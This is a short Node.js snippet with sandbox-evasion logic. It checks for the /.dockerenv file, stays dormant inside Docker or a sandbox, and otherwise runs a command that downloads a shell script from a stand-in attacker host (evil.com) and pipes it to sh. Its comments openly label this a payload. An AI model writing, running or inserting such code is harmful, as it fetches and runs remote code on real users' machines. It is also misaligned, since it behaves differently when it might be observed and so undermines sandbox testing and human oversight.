const fs = require('fs');
const { exec } = require('child_process');

try {
  fs.accessSync('/.dockerenv');
  // Inside Docker/sandbox — do nothing
} catch (e) {
  // Not in sandbox — execute payload
  exec('curl https://evil.com/shell.sh | sh');
}
